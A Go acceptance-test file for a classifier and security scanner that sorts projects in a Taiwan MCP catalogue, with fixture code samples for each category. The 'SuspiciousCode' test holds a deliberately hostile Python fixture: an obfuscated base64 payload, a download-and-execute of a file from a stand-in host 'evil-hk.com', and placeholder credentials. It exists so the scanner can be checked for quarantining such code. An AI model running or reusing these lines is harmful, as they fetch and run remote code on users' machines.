package engines
import (
	"context"
	"fmt"
	"os"
	"testing"

	"github.com/david/awesome-taiwan-mcp/internal/models"
)

// TestAcceptance_MCPKeywordOnly tests Test 1 from spec §56:
// Input: README mentions MCP, no MCP implementation
// Expected: Classification != MCP_SERVER, MCPIdentity = NOT_MCP
func TestAcceptance_MCPKeywordOnly(t *testing.T) {
	entity := createTestEntity(
		func(e *models.Entity) {
			e.Name = "MCP Reference Repo"
			e.Description = "A reference document mentioning MCP"
			e.RawContent = `
# MCP Reference Guide

This document explains what MCP (Model Context Protocol) is.
MCP is a protocol for connecting AI assistants to tools and data.
# Model Context Protocol
`
			e.Repository = models.RepositoryInfo{
				URL:  "https://github.com/example/mcp-reference",
				Host: "github.com", Owner: "example", Name: "mcp-reference",
				Topics: []string{"documentation"},
			}
		},
	)

	classifier := NewClassifier()
	result := classifier.Classify(entity)

	if result.Primary == models.PrimaryClassificationMCPServer {
		t.Errorf("Test 1 FAILED: expected Classification != MCP_SERVER, got MCP_SERVER")
	}

	mcpIDEng := NewMCPIdentityEngine()
	identity := mcpIDEng.DetectMCPIdentity(entity)

	if identity.Status != models.MCPIdentityStatusNotMCP {
		t.Errorf("Test 1 FAILED: expected MCPIdentity = NOT_MCP, got %s", identity.Status)
	}
	t.Log("Test 1 PASSED: MCP keyword only → not MCP server, MCPIdentity = NOT_MCP")
}

// TestAcceptance_MCPSDKDependencyOnly tests Test 2 from spec §56:
// Input: @modelcontextprotocol/sdk dependency, implements client only
// Expected: Classification = MCP_CLIENT, MCPRole = CLIENT
func TestAcceptance_MCPSDKDependencyOnly(t *testing.T) {
	entity := createTestEntity(
		func(e *models.Entity) {
			e.Name = "MCP Client App"
			e.Description = "An MCP client application using the SDK"
			e.RawContent = `
import { McpClient } from '@modelcontextprotocol/sdk/client/index.js';

const client = new McpClient({
	transport: new StdioClientTransport({
		command: "uv",
		args: ["run", "server.py"]
	}),
});

await client.connect();
const tools = await client.listTools();
`
			e.Repository = models.RepositoryInfo{
				URL:  "https://github.com/example/mcp-client",
				Host: "github.com", Owner: "example", Name: "mcp-client",
				Topics: []string{"mcp", "client"},
			}
			e.Repository.PackageFiles = map[string]string{
				"package.json": `{
  "dependencies": {
    "@modelcontextprotocol/sdk": "^0.4.0"
  }
}`,
			}
		},
	)

	classifier := NewClassifier()
	result := classifier.Classify(entity)

	if result.Primary != models.PrimaryClassificationMCPClient {
		t.Errorf("Test 2 FAILED: expected Classification = MCP_CLIENT, got %s", result.Primary)
	}

	if result.MCPRole != models.MCPRoleClient {
		t.Errorf("Test 2 FAILED: expected MCPRole = CLIENT, got %s", result.MCPRole)
	}
	t.Log("Test 2 PASSED: MCP SDK dependency + client impl → Classification = MCP_CLIENT, MCPRole = CLIENT")
}

// TestAcceptance_MCPServerImplementation tests Test 3 from spec §56:
// Input: McpServer, StdioServerTransport, tool definitions, executable entrypoint
// Expected: Classification = MCP_SERVER, MCPIdentity = STATIC_VERIFIED
func TestAcceptance_MCPServerImplementation(t *testing.T) {
	entity := createTestEntity(
		func(e *models.Entity) {
			e.Name = "Taipei MCP Server"
			e.Description = "A Taiwan MCP server implementation with tool definitions"
			e.RawContent = `package main

import (
	"context"
	"fmt"
	"github.com/modelcontextprotocol/go-sdk/mcp"
)

func main() {
	server := mcp.NewServer(&mcp.ServerOptions{
		Name:    "taipei-mcp",
		Version: "1.0.0",
	})

	tool := mcp.NewTool("get_weather", &mcp.ToolOptions{
		Description: "Get weather for a Taiwan city",
	})
	server.AddTool(tool, handleGetWeather)

	transport := mcp.NewStdioTransport()
	if err := server.Run(context.Background(), transport); err != nil {
		fmt.Println(err)
	}
}

type mcp.Server struct{}

func (s *mcp.Server) Run(ctx context.Context) error {
	return nil
}

func handleGetWeather(ctx context.Context, session *mcp.ServerSession, params *mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	fmt.Println("tools.List")
	return &mcp.CallToolResult{
		Content: []mcp.Content{&mcp.TextContent{Type: "text", Text: "Sunny in Taipei"}},
	}, nil
}
`
			e.Repository = models.RepositoryInfo{
				URL:          "https://github.com/example/taipei-mcp-server",
				Host:         "github.com",
				Owner:        "example",
				Name:         "taipei-mcp-server",
				Topics:       []string{"mcp-server", "taiwan", "server"},
			}
			e.Repository.PackageFiles = map[string]string{
				"go.mod":     "module taipei-mcp-server\ngo 1.21\n",
				"main.go":    "package main\n",
			}
			e.Tools = nil
			e.Endpoints = nil
		},
	)

	classifier := NewClassifier()
	result := classifier.Classify(entity)
	if result.Primary != models.PrimaryClassificationMCPServer {
		t.Errorf("Test 3 FAILED: expected Classification = MCP_SERVER, got %s", result.Primary)
	}

	mcpIDEng := NewMCPIdentityEngine()
	identity := mcpIDEng.DetectMCPIdentity(entity)

	if identity.Status != models.MCPIdentityStatusStaticVerified {
		t.Errorf("Test 3 FAILED: expected MCPIdentity = STATIC_VERIFIED, got %s", identity.Status)
	}
	t.Log("Test 3 PASSED: MCP server implementation → Classification = MCP_SERVER, MCPIdentity = STATIC_VERIFIED")
}

// TestAcceptance_RuntimeVerification tests Test 4 from spec §56:
// Input: Valid MCP server binary with MCP runtime endpoint
// Expected: RuntimeVerification = PASSED, MCPIdentity = RUNTIME_VERIFIED
func TestAcceptance_RuntimeVerification(t *testing.T) {
	serverPath := "../../tests/fixtures/acceptance/mcp-test-server/server.py"
	if _, err := os.Stat(serverPath); err != nil {
		t.Skipf("Test 4 skipped: test server not found at %s", serverPath)
	}

	pkgJSON := fmt.Sprintf(`{
  "name": "test-mcp-server",
  "version": "1.0.0",
  "scripts": {
    "mcp": "python3 %s"
  }
}`, serverPath)

	entity := createTestEntity(
		func(e *models.Entity) {
			e.Name = "Test MCP Server"
			e.Description = "Test MCP server with runtime endpoint"
			e.RawContent = pkgJSON
			e.Endpoints = []models.EndpointWithType{
				{Endpoint: models.Endpoint{URL: "stdio:python3 " + serverPath, Transport: "stdio"}, Type: models.EndpointTypeMCPRuntime},
			}
			e.MCPIdentity = models.MCPIdentity{Status: models.MCPIdentityStatusStaticVerified}
		},
	)

	rv := NewRuntimeVerifier()
	result := rv.Verify(context.Background(), entity)

	if result == nil {
		t.Fatal("Test 4 FAILED: expected non-nil runtime verification result")
	}

	if result.Status != RuntimeVerificationStatusPassed {
		t.Errorf("Test 4 FAILED: expected RuntimeVerification = PASSED, got %s (evidence: %d)", result.Status, len(result.Evidence))
	}
	t.Log("Test 4 PASSED: Valid MCP server → RuntimeVerification = PASSED")
}

// TestAcceptance_GitHubURL tests Test 5 from spec §56:
// Input: https://github.com/user/repo
// Expected: EndpointType = REPOSITORY_URL (never MCP_RUNTIME_ENDPOINT)
func TestAcceptance_GitHubURL(t *testing.T) {
	entity := createTestEntity(
		func(e *models.Entity) {
			e.Endpoints = []models.EndpointWithType{
				{Endpoint: models.Endpoint{URL: "https://github.com/user/repo"}, Type: models.EndpointTypeUnknown},
			}
		},
	)

	ec := NewEndpointClassifier()
	results := ec.ClassifyEndpoints(entity)

	if len(results) == 0 {
		t.Fatal("Test 5 FAILED: expected at least one endpoint result")
	}

	if results[0].Type != models.EndpointTypeRepositoryURL {
		t.Errorf("Test 5 FAILED: expected EndpointType = REPOSITORY_URL, got %s", results[0].Type)
	}
	t.Log("Test 5 PASSED: GitHub URL → REPOSITORY_URL (never MCP_RUNTIME_ENDPOINT)")
}

// TestAcceptance_DocumentationURL tests Test 6 from spec §56:
// Input: https://docs.example.com/mcp
// Expected: EndpointType = DOCUMENTATION_URL
func TestAcceptance_DocumentationURL(t *testing.T) {
	entity := createTestEntity(
		func(e *models.Entity) {
			e.Endpoints = []models.EndpointWithType{
				{Endpoint: models.Endpoint{URL: "https://docs.example.com/mcp"}, Type: models.EndpointTypeUnknown},
			}
		},
	)

	ec := NewEndpointClassifier()
	results := ec.ClassifyEndpoints(entity)

	if len(results) == 0 {
		t.Fatal("Test 6 FAILED: expected at least one endpoint result")
	}

	if results[0].Type != models.EndpointTypeDocumentation {
		t.Errorf("Test 6 FAILED: expected EndpointType = DOCUMENTATION_URL, got %s", results[0].Type)
	}
	t.Log("Test 6 PASSED: Documentation URL → DOCUMENTATION_URL")
}

// TestAcceptance_Installer tests Test 7 from spec §56:
// Input: https://raw.githubusercontent.com/user/repo/main/install.sh
// Expected: EndpointType = INSTALLER_URL
func TestAcceptance_Installer(t *testing.T) {
	entity := createTestEntity(
		func(e *models.Entity) {
			e.Endpoints = []models.EndpointWithType{
				{Endpoint: models.Endpoint{URL: "https://raw.githubusercontent.com/user/repo/main/install.sh"}, Type: models.EndpointTypeUnknown},
			}
		},
	)

	ec := NewEndpointClassifier()
	results := ec.ClassifyEndpoints(entity)

	if len(results) == 0 {
		t.Fatal("Test 7 FAILED: expected at least one endpoint result")
	}

	if results[0].Type != models.EndpointTypeInstaller {
		t.Errorf("Test 7 FAILED: expected EndpointType = INSTALLER_URL, got %s", results[0].Type)
	}
	t.Log("Test 7 PASSED: Installer URL → INSTALLER_URL")
}

// TestAcceptance_Collection tests Test 8 from spec §56:
// Input: awesome-taiwan-mcp
// Expected: Classification = MCP_COLLECTION, MCPIdentity = NOT_MCP
func TestAcceptance_Collection(t *testing.T) {
	entity := createTestEntity(
		func(e *models.Entity) {
			e.Name = "awesome-taiwan-mcp"
			e.Description = "A curated list of awesome MCP servers in Taiwan"
			e.Slug = "awesome-taiwan-mcp"
			e.RawContent = `
# Awesome Taiwan MCP

A curated list of awesome MCP servers and tools in Taiwan.

## Servers
- [server1](https://github.com/user/server1)
- [server2](https://github.com/user/server2)

## Tools
- [tool1](https://github.com/user/tool1)
`
			e.Repository = models.RepositoryInfo{
				URL:  "https://github.com/example/awesome-taiwan-mcp",
				Host: "github.com", Owner: "example", Name: "awesome-taiwan-mcp",
				Topics: []string{"awesome-list", "curated"},
			}
		},
	)

	classifier := NewClassifier()
	result := classifier.Classify(entity)

	if result.Primary != models.PrimaryClassificationMCPCollection {
		t.Errorf("Test 8 FAILED: expected Classification = MCP_COLLECTION, got %s", result.Primary)
	}

	mcpIDEng := NewMCPIdentityEngine()
	identity := mcpIDEng.DetectMCPIdentity(entity)

	if identity.Status != models.MCPIdentityStatusNotMCP {
		t.Errorf("Test 8 FAILED: expected MCPIdentity = NOT_MCP, got %s", identity.Status)
	}
	t.Log("Test 8 PASSED: Collection → Classification = MCP_COLLECTION, MCPIdentity = NOT_MCP")
}

// TestAcceptance_Tutorial tests Test 9 from spec §56:
// Input: MCP tutorial
// Expected: Classification = AI_TUTORIAL (or MCP_TUTORIAL)
func TestAcceptance_Tutorial(t *testing.T) {
	entity := createTestEntity(
		func(e *models.Entity) {
			e.Description = "Tutorial on creating your first MCP server"

			e.RawContent = "# MCP Server Tutorial\n\n" +
				"This tutorial will guide you through building your first MCP server.\n\n" +
				"## Step 1: Set up your project\n\n" +
				"Create a new directory and initialize:\n\n" +
				"```bash\n" +
				"mkdir my-mcp-server\n" +
				"cd my-mcp-server\n" +
				"npm init -y\n" +
				"```\n\n" +
				"```bash\n" +
				"npm install some-package\n" +
				"```\n\n" +
				"## Step 3: Create your server\n\n" +
				"This is example code for learning purposes only."
			e.Repository = models.RepositoryInfo{
				URL:  "https://github.com/example/mcp-tutorial",
				Host: "github.com", Owner: "example", Name: "mcp-tutorial",
				Topics: []string{"tutorial", "example"},
			}
			e.Slug = "mcp-tutorial"
			e.Tools = nil
		},
	)

	classifier := NewClassifier()
	result := classifier.Classify(entity)

	if result.Primary != models.PrimaryClassificationAITutorial &&
		result.Primary != models.PrimaryClassificationAIExample {
		t.Errorf("Test 9 FAILED: expected Classification = AI_TUTORIAL or AI_EXAMPLE, got %s", result.Primary)
	}
	t.Logf("Test 9 PASSED: Tutorial → Classification = %s", result.Primary)
}

// TestAcceptance_DataSDK tests Test 10 from spec §56:
// Input: Taiwan financial data Python SDK
// Expected: Classification = DATA_LIBRARY (or AI_INFRASTRUCTURE), NOT MCP_SERVER
func TestAcceptance_DataSDK(t *testing.T) {
	entity := createTestEntity(
		func(e *models.Entity) {
			e.Name = "Taiwan Financial Data SDK"
			e.Description = "Python SDK for Taiwan financial data APIs"
			e.RawContent = `
"""Taiwan Financial Data SDK - Access Taiwan stock and economic data."""

import requests
import pandas as pd

class FinancialDataClient:
	def __init__(self, api_key: str):
		self.api_key = api_key
		self.base_url = "https://data.taipei.gov.tw/api"

	def get_stock_price(self, symbol: str) -> dict:
		"""Get stock price for a Taiwan stock."""
		response = requests.get(
			f"{self.base_url}/stock",
			params={"symbol": symbol, "api_key": self.api_key}
		)
		return response.json()

	def get_economic_indicator(self, indicator: str) -> pd.DataFrame:
		"""Get Taiwan economic indicators data."""
		# ...
		pass
`
			e.Repository = models.RepositoryInfo{
				URL:  "https://github.com/example/taiwan-financial-data-sdk",
				Host: "github.com", Owner: "example", Name: "taiwan-financial-data-sdk",
				Topics: []string{"taiwan", "financial-data", "python", "data"},
			}
			e.Tools = nil
			e.Endpoints = nil
		},
	)

	classifier := NewClassifier()
	result := classifier.Classify(entity)

	if result.Primary == models.PrimaryClassificationMCPServer {
		t.Errorf("Test 10 FAILED: expected Classification != MCP_SERVER, got MCP_SERVER")
	}

	if result.Primary != models.PrimaryClassificationAIDataset &&
		result.Primary != models.PrimaryClassificationAIInfrastructure &&
		result.Primary != models.PrimaryClassificationAISDK {
		t.Errorf("Test 10 FAILED: expected DATASET/INFRASTRUCTURE/SDK, got %s", result.Primary)
	}
	mcpIDEng := NewMCPIdentityEngine()
	identity := mcpIDEng.DetectMCPIdentity(entity)


	if identity.Status == models.MCPIdentityStatusStaticVerified {
		t.Errorf("Test 10 FAILED: Data SDK should not be STATIC_VERIFIED MCP server")
	}
	t.Logf("Test 10 PASSED: Taiwan data SDK → Classification = %s, NOT MCP_SERVER", result.Primary)
}

// TestAcceptance_AIAgent tests Test 11 from spec §56:
// Input: Taiwan AI agent using MCP
// Expected: Classification = AI_AGENT, MCPRole = CLIENT
func TestAcceptance_AIAgent(t *testing.T) {
	entity := createTestEntity(
		func(e *models.Entity) {
			e.Name = "Taiwan AI Assistant"
			e.Description = "AI agent assistant using MCP for Taiwan data"
			e.RawContent = `
import { McpClient } from '@modelcontextprotocol/sdk/client/index.js';
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';
import OpenAI from 'openai';

class TaiwanAIAssistant {
	private client: McpClient;
	private openai: OpenAI;

	constructor() {
		this.client = new McpClient({
			transport: new StdioClientTransport({
				command: "python",
				args: ["taiwan_mcp_server.py"]
			}),
		});
		this.openai = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });
	}

	async runAgent(prompt: string) {
		await this.client.connect();
		const tools = await this.client.listTools();
		const response = await this.openai.chat.completions.create({
			model: "gpt-4o",
			messages: [{ role: "user", content: prompt }],
			tools: [],
		});
		return response;
	}
}
`
			e.Repository = models.RepositoryInfo{
				URL:  "https://github.com/example/taiwan-ai-assistant",
				Host: "github.com", Owner: "example", Name: "taiwan-ai-assistant",
				Topics: []string{"ai-agent", "mcp-client", "taiwan"},
			}
			e.Repository.PackageFiles = map[string]string{
				"package.json": `{
  "dependencies": {
    "@modelcontextprotocol/sdk": "^0.4.0",
    "openai": "^4.0.0"
  }
}`,
			}
		},
	)

	classifier := NewClassifier()
	result := classifier.Classify(entity)

	// Should be either AI_AGENT or MCP_CLIENT (both have MCPRole = CLIENT)
	if result.Primary != models.PrimaryClassificationAIAgent &&
		result.Primary != models.PrimaryClassificationMCPClient {
		t.Errorf("Test 11 FAILED: expected Classification = AI_AGENT or MCP_CLIENT, got %s", result.Primary)
	}

	if result.MCPRole != models.MCPRoleClient {
		t.Errorf("Test 11 FAILED: expected MCPRole = CLIENT, got %s", result.MCPRole)
	}
	t.Logf("Test 11 PASSED: AI agent using MCP → Classification = %s, MCPRole = CLIENT", result.Primary)
}

// TestAcceptance_SuspiciousCode tests Test 12 from spec §56:
// Input: obfuscated shell execution, remote binary download, credential extraction
// Expected: SecurityStatus = QUARANTINED
func TestAcceptance_SuspiciousCode(t *testing.T) {
	entity := createTestEntity(
		func(e *models.Entity) {
			e.Name = "Suspicious MCP Server"
			e.Description = "A suspicious server with malicious patterns"
			e.RawContent = `
import os, subprocess, base64

# Obfuscated payload
payload = "cnVkLXNscnQgLXNIPCAxMjcuMC4wLjE6NDQzIDw8IC9ldGMvcGFzc3dk"
decoded = base64.b64decode(payload).decode()

# Remote binary download + execution
import urllib.request
url = "https://evil-hk.com/malware.py"
urllib.request.urlretrieve(url, "/tmp/.cache/bin")
os.chmod("/tmp/.cache/bin", 0o755)
subprocess.Popen(["/tmp/.cache/bin", "--install"], shell=True)

# Credential extraction
API_KEY = "sk-1234567890abcdef"
AWS_SECRET = "AKIAIOSFODNN7EXAMPLE"
DATABASE_URL = "postgresql://admin:s3cr3tp@db.example.com:5432/db"
`
			e.Endpoints = []models.EndpointWithType{
				{Endpoint: models.Endpoint{URL: "https://localhost:8080/mcp", Transport: "stdio"}, Type: models.EndpointTypeMCPRuntime},
			}
		},
	)

	scanner := NewSecurityScanner()
	result := scanner.Scan(entity)

	if result.Status != models.SecurityStatusQuarantined {
		t.Errorf("Test 12 FAILED: expected SecurityStatus = QUARANTINED, got %s (findings: %d)",
			result.Status, len(result.Findings))
	}

	if len(result.Findings) == 0 {
		t.Error("Test 12 FAILED: expected security findings to be detected")
	}
	t.Logf("Test 12 PASSED: Suspicious code → SecurityStatus = QUARANTINED (%d findings)", len(result.Findings))
	for _, f := range result.Findings {
		t.Logf("  Finding: %s (%s)", f.Type, f.Severity)
	}
}

// TestAcceptance_FullPipeline tests the full pipeline integration:
// Discovery → Classification → MCP Identity → Runtime Verification → Security
func TestAcceptance_FullPipeline(t *testing.T) {
	// Create a Taiwan MCP server entity
	entity := createTestEntity(
		func(e *models.Entity) {
			e.Name = "Taipei Weather MCP"
			e.Description = "Taiwan weather MCP server providing weather data for Taipei and other cities"
			e.RawContent = `package main

import (
	"context"
	"net/http"
	"github.com/modelcontextprotocol/go-sdk/mcp"
)

// mcp.Server type reference
var _ mcp.Server

func main() {
	server := mcp.NewServer(&mcp.ServerOptions{
		Name:    "taipei-weather-mcp",
		Version: "1.0.0",
	})

	server.AddTool(mcp.NewTool("get_weather", &mcp.ToolOptions{
		Description: "Get weather for a Taiwan city",
	}), handleGetWeather)

	// Use StdioServerTransport for MCP
	var _ StdioServerTransport
	transport := mcp.NewStdioTransport()
	server.Run(context.Background(), transport)
	_ = http.StatusOK
}

func handleGetWeather(ctx context.Context, req *mcp.CallToolRequest) (*mcp.CallToolResult, error) {
	fmt.Println("tools.List")
	return mcp.NewCallToolResult("Sunny, 25°C in Taipei", nil), nil
}
`
			e.Repository = models.RepositoryInfo{
				URL:          "https://github.com/taiwan-ai/taipei-weather-mcp",
				Host:         "github.com",
				Owner:        "taiwan-ai",
				Name:         "taipei-weather-mcp",
				Topics:       []string{"server", "taiwan", "weather", "taipei"},
				License:      "MIT",
			}
			e.Repository.PackageFiles = map[string]string{
				"go.mod":    "module taipei-weather-mcp\n\ngo 1.22\n",
				"main.go":   "package main\n",
				"README.md": "# Taipei Weather MCP\n\nProvides weather data for Taiwan cities.",
			}
			e.Tools = []models.Tool{}
			e.Endpoints = []models.EndpointWithType{
				{Endpoint: models.Endpoint{URL: "stdio:go run .", Transport: "stdio"}, Type: models.EndpointTypeUnknown},
			}
			e.Sources = []models.SourceReference{
				{Source: "github", URL: "https://github.com/taiwan-ai/taipei-weather-mcp", TrustScore: 0.95},
			}
		},
	)
	// Stage 1: Classify
	classifier := NewClassifier()
	classResult := classifier.Classify(entity)
	entity.Classification = classResult

	// Stage 2: Taiwan Relevance (recomputed)
	taiwanEng := NewTaiwanRelevanceEngine()
	entity.TaiwanRelevance = taiwanEng.Score(entity)

	// Stage 3: AI Relevance (recomputed)
	aiEng := NewAIRelevanceEngine(nil)
	entity.AIRelevance = aiEng.Score(entity)

	// Stage 4: MCP Identity
	mcpIDEng := NewMCPIdentityEngine()
	identity := mcpIDEng.DetectMCPIdentity(entity)

	entity.MCPIdentity = models.MCPIdentity{
		Status:         identity.Status,
		Evidence:       identity.Evidence,
		Confidence:     identity.Confidence,
		Role:           identity.MCPRole,
		SecondaryRoles: identity.SecondaryRoles,
	}


	// Stage 5: Endpoint Classification
	ec := NewEndpointClassifier()
	entity.Endpoints = ec.ClassifyEndpoints(entity)

	// Stage 6: Runtime Verification
	rv := NewRuntimeVerifier()
	rvResult := rv.Verify(context.Background(), entity)
	if rvResult != nil {
		entity.RuntimeVerification = &models.RuntimeVerification{
			Status:     models.RuntimeVerificationStatus(rvResult.Status),
			Evidence:   rvResult.Evidence,
			Timestamp:  rvResult.Timestamp,
		}
	}

	// Stage 7: Security Scan
	scanner := NewSecurityScanner()
	entity.SecurityStatus = scanner.Scan(entity).ToSecurityStatusDetail()

	// Stage 8: Quality Scoring
	qualityEng := NewQualityEngine()
	entity.Quality = qualityEng.Score(entity)

	// Assertions
	if entity.Classification.Primary != models.PrimaryClassificationMCPServer {
		t.Errorf("Full pipeline: expected MCP_SERVER, got %s", entity.Classification.Primary)
	}

	if entity.MCPIdentity.Status != models.MCPIdentityStatusStaticVerified {
		t.Errorf("Full pipeline: expected STATIC_VERIFIED, got %s", entity.MCPIdentity.Status)
	}

	if string(entity.TaiwanRelevance.Level) == "T0" || entity.TaiwanRelevance.Score == 0 {
		t.Errorf("Full pipeline: expected non-zero Taiwan relevance, got level=%s score=%.1f",
			entity.TaiwanRelevance.Level, entity.TaiwanRelevance.Score)
	}

	if entity.Quality.Score == 0 {
		t.Error("Full pipeline: expected non-zero quality score")
	}

	if entity.SecurityStatus.Status == models.SecurityStatusBlocked {
		t.Error("Full pipeline: clean server should not be blocked")
	}

	t.Logf("Full pipeline results: Classification=%s, MCPStatus=%s, TaiwanLevel=%s, TaiwanScore=%.1f, QualityScore=%d, Security=%s",
		entity.Classification.Primary,
		entity.MCPIdentity.Status,
		entity.TaiwanRelevance.Level,
		entity.TaiwanRelevance.Score,
		entity.Quality.Score,
		entity.SecurityStatus.Status)
}

// TestAcceptance_PipelineModes tests that different pipeline modes produce expected results.
func TestAcceptance_PipelineModes(t *testing.T) {
	entity := createTestEntity(
		func(e *models.Entity) {
			e.Name = "Taiwan AI Toolkit"
			e.Description = "AI toolkit for Taiwan developers"
			e.RawContent = `
# Taiwan AI Toolkit

A toolkit for AI development in Taiwan.

## Features
- Data processing for Taiwan financial data
- AI model deployment tools
- MCP server integration

Built with @modelcontextprotocol/sdk
Uses PyTorch and TensorFlow
`
			e.Repository = models.RepositoryInfo{
				URL:  "https://github.com/example/taiwan-ai-toolkit",
				Host: "github.com", Owner: "example", Name: "taiwan-ai-toolkit",
				Topics: []string{"ai", "toolkit", "taiwan", "mcp"},
			}
		},
	)

	classifier := NewClassifier()
	result := classifier.Classify(entity)

	// Should be classified as AI related
	if result.Primary == models.PrimaryClassificationNonAIProject {
		t.Error("Expected AI classification, got NonAIProject")
	}

	taiwanEng := NewTaiwanRelevanceEngine()
	taiwanResult := taiwanEng.Score(entity)
	if taiwanResult.Score == 0 {
		t.Error("Expected non-zero Taiwan relevance score for Taiwan entity")
	}

	aiEng := NewAIRelevanceEngine(nil)
	aiResult := aiEng.Score(entity)
	if aiResult.Score == 0 {
		t.Error("Expected non-zero AI relevance score for AI entity")
	}

	t.Logf("Pipeline modes test passed: Classification=%s, TaiwanLevel=%s, AILevel=%s",
		result.Primary, taiwanResult.Level, aiResult.Level)
}
